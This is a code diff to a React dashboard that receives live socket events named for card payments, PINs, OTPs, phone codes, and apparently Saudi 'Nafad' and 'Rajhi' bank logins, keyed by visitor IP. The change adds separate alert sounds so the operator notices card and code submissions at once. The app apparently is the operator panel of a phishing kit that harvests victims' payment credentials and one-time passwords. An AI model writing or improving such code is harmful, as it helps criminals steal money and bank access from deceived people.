@@ -14,13 +14,51 @@ export default function App() {
   const [infoIp, setInfoIp] = useState(null);
   const [highlightIp, setHighlightIp] = useState(null);
 
-  // 🔊 Only ONE sound: new data submissions (no "new IP/visit" sound)
+  // 🔊 Three sounds: data, card, code
   const updateSound = useRef();
+  const cardSound = useRef();
+  const codeSound = useRef();
+  const audioUnlocked = useRef(false);
 
   const navigate = useNavigate();
 
   useEffect(() => {
-    updateSound.current = new Audio("/sounds/new-data.wav"); // keep your file name
+    // Load all sounds
+    updateSound.current = new Audio("/sounds/new-data.wav");
+    cardSound.current = new Audio("/sounds/new-card.wav");
+    codeSound.current = new Audio("/sounds/new-code.wav");
+    
+    // Preload all sounds
+    updateSound.current.preload = "auto";
+    cardSound.current.preload = "auto";
+    codeSound.current.preload = "auto";
+    
+    updateSound.current.load();
+    cardSound.current.load();
+    codeSound.current.load();
+    
+    // Unlock audio on first user interaction
+    const unlockAudio = () => {
+      if (audioUnlocked.current) return;
+      
+      [updateSound.current, cardSound.current, codeSound.current].forEach(sound => {
+        const promise = sound.play();
+        if (promise !== undefined) {
+          promise.then(() => {
+            sound.pause();
+            sound.currentTime = 0;
+          }).catch(() => {});
+        }
+      });
+      
+      audioUnlocked.current = true;
+    };
+    
+    // Listen for any user interaction
+    const events = ['click', 'touchstart', 'keydown'];
+    events.forEach(event => {
+      document.addEventListener(event, unlockAudio, { once: true });
+    });
 
     (async () => {
       const token = localStorage.getItem("token");
@@ -177,14 +215,27 @@ export default function App() {
         setUsers(map);
       });
 
-      // Helpers
-      const playNewDataSound = () => {
+      // Helpers - Sound functions
+      const playSound = (soundRef) => {
+        if (!soundRef.current) return;
+        
         try {
-          updateSound.current && updateSound.current.play();
-        } catch {
-          // ignore autoplay errors
+          soundRef.current.currentTime = 0; // Reset to start
+          const playPromise = soundRef.current.play();
+          
+          if (playPromise !== undefined) {
+            playPromise.catch((error) => {
+              console.warn('Audio play prevented:', error);
+            });
+          }
+        } catch (err) {
+          console.warn('Sound playback error:', err);
         }
       };
+
+      const playNewDataSound = () => playSound(updateSound);
+      const playCardSound = () => playSound(cardSound);
+      const playCodeSound = () => playSound(codeSound);
 
       // Merge for real NEW DATA submissions (plays sound + marks new)
       const mergeData = (u) => {
@@ -197,6 +248,32 @@ export default function App() {
           };
 
           playNewDataSound();
+
+          return {
+            ...m,
+            [u.ip]: {
+              ...oldObj,
+              ...u,
+              payments: oldObj.payments,
+              flag: oldObj.flag,
+              hasNewData: true, // ✅ mark as new data
+              hasPayment: oldObj.hasPayment || u.hasPayment === true,
+            },
+          };
+        });
+      };
+
+      // Merge for CODE submissions (plays code sound + marks new)
+      const mergeCode = (u) => {
+        setUsers((m) => {
+          const oldObj = m[u.ip] || {
+            payments: [],
+            flag: false,
+            hasNewData: false,
+            hasPayment: false,
+          };
+
+          playCodeSound(); // Use code sound
 
           return {
             ...m,
@@ -257,8 +334,8 @@ export default function App() {
           });
           if (dup) return m;
 
-          // sound only for real submissions
-          playNewDataSound();
+          // sound for card payment
+          playCardSound();
 
           return {
             ...m,
@@ -303,9 +380,9 @@ export default function App() {
       socket.on("newBilling", (u) => mergeData(u));
       socket.on("newPayment", (u) => appendPayment(u));
       socket.on("newPhone", (u) => mergeData(u));
-      socket.on("newPin", (u) => mergeData(u));
-      socket.on("newOtp", (u) => mergeData(u));
-      socket.on("newPhoneCode", (u) => mergeData(u));
+      socket.on("newPin", (u) => mergeCode(u)); // Use code sound
+      socket.on("newOtp", (u) => mergeCode(u)); // Use code sound
+      socket.on("newPhoneCode", (u) => mergeCode(u)); // Use code sound
       socket.on("newNafad", (u) => mergeData(u));
       socket.on("newNewDate", (r) => mergeData(r));
       // 🔹 NEW: Rajhi submissions
@@ -339,6 +416,13 @@ export default function App() {
       socket.on("userDeleted", removeUser);
       socket.on("flagUpdated", updateFlag);
     })();
+    
+    // Cleanup: remove event listeners
+    return () => {
+      events.forEach(event => {
+        document.removeEventListener(event, unlockAudio);
+      });
+    };
   }, [navigate]);
 
   // 👇 Open the card without clearing the paid flag.
